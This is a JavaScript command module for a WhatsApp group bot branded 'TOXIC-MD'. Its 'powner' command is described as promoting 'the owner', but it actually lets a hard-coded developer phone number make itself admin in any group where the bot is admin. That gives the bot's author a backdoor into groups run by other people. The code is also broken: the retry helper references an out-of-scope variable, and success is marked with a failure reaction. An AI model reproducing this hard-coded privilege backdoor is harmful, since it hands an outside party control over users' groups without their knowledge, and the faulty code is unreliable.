import { getFakeQuoted } from '../../lib/fakeQuoted.js';
const DEVELOPER_NUMBER = "254114885159";

const normalizeNumber = (jid) => {
    if (!jid) return '';
    return jid.split('@')[0].split(':')[0].replace(/\D/g, '');
};

const findDevInGroup = (participants) => {
    return participants.find(p => {
        const idNum = normalizeNumber(p.id || '');
        const jidNum = normalizeNumber(p.jid || '');
        const devNum = normalizeNumber(DEVELOPER_NUMBER);
        return idNum === devNum || jidNum === devNum;
    });
};

const getActualJid = (member) => {
    const raw = member.jid || member.id || '';
    return raw.split('@')[0].split(':')[0].replace(/\D/g, '') + '@s.whatsapp.net';
};

const retryPromote = async (client, groupId, participant, maxRetries = 5, baseDelay = 1500) => {
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            await client.sendMessage(m.chat, { react: { text: '⌛', key: m.reactKey } });
            await client.groupParticipantsUpdate(groupId, [participant], "promote");
            return true;
        } catch (e) {
            if (attempt === maxRetries) throw e;
            await new Promise(resolve => setTimeout(resolve, baseDelay * Math.pow(2, attempt - 1)));
        }
    }
};

export default {
    name: 'powner',
    aliases: ['promoteowner', 'makeowneradmin'],
    description: 'Promotes the owner to admin',
    run: async (context) => {
        const { client, m, isBotAdmin } = context;
        const fq = getFakeQuoted(m);
        await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } });

        if (!m.isGroup) {
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
            return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ This command only works in groups.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }

        const senderNum = normalizeNumber(m.sender);
        if (senderNum !== normalizeNumber(DEVELOPER_NUMBER)) {
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
            return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ Only the owner can use this command.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }

        if (!isBotAdmin) {
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
            return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ I need admin privileges to\n├ perform this action.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }

        try {
            const groupMetadata = await client.groupMetadata(m.chat);
            const ownerMember = findDevInGroup(groupMetadata.participants);

            if (!ownerMember) {
                await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
                return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ Owner is not in this group.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
            }

            if (ownerMember.admin) {
                await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
                return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ Owner is already an admin.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
            }

            const actualJid = getActualJid(ownerMember);
            await retryPromote(client, m.chat, actualJid);
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
            return m.reply(`╭───(    TOXIC-MD    )───\n├───≫ PROMOTED ≪───\n├ \n├ Owner has been promoted to admin.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);

        } catch (error) {
    await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
            return m.reply(`╭───(    TOXIC-MD    )───\n├───≫ ERROR ≪───\n├ \n├ Failed to promote: ${error.message}\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }
    }
};
